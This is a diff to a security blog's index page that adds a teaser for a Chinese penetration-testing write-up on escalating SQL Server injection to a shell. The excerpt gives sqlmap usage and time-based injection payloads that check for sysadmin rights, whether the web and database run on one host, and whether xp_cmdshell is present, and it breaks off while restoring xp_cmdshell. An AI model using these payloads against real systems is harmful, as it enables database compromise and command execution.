@@ -125,6 +125,69 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
+        <h2><a href="http://wyb0.com/posts/2019/sql-server-from-injection-to-getshell/">从 SQL Server 注入到 getshell</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    
+                        2019-03-02
+                    
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/pentest">pentest</a>&nbsp;&#47;
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/getshell">getshell</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 目标情况  一个web站点111.*.*.63，只有一个登陆框，测试了没有注入，没有弱口令 扫描了全端口，没有发现什么有用的信息  0x01 发现注入 当时是查看网页源代码，有两个可疑接口，一个是初始化密码借口，访问返回空白页面，没有什么用
+另一个是密码设置接口，不过这个接口是同网段的另一个ip 111.*.*.59，访问后发现是个重置密码的界面 但是进行密码重置的时候需要发送验证码，系统会先校验用户名是否存在，加单引号出错，and 1=2没反应
+burpsuite抓包后sqlmap跑了下，python sqlmap.py -r 1.txt，存在注入 通过sqlmap得到了这几个数据库
+[*] HSOA_20170320 [*] HSOA_NEW [*] HSOA_T [*] master [*] model [*] msdb [*] Shuttle [*] SHWT [*] tempdb  0x02 找网站绝对路径  判断是不是dba权限(延时后返回正确页面，确定为dba权限&lt;也可用sqlmap的&ndash;is-dba判断&gt;)  uname=test';if(1=(select is_srvrolemember('sysadmin'))) WAITFOR DELAY '0:0:2';--   判断是否是站库分离(延时后返回正确页面，确定站库没有分离)  uname=test';if(host_name()=@@servername) WAITFOR DELAY '0:0:5';--   查看是否有xp_cmdshell  uname=test';if(1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell')) WAITFOR DELAY '0:0:2'--  恢复／删除xp_cmdshell exec sp_addextendedproc xp_cmdshell,@dllname='xplog70.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2019/sql-server-from-injection-to-getshell/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+                
+                    
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
         <h2><a href="http://wyb0.com/posts/2016/tomcat-deploy-war-package-to-getshell/">Tomcat部署War包getshell</a></h2>
 
         
@@ -302,7 +365,7 @@
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/getshell" title="getshell">getshell</a>
-                <sup>2</sup>
+                <sup>3</sup>
             </p>
         
             <p style="display:inline-block;">
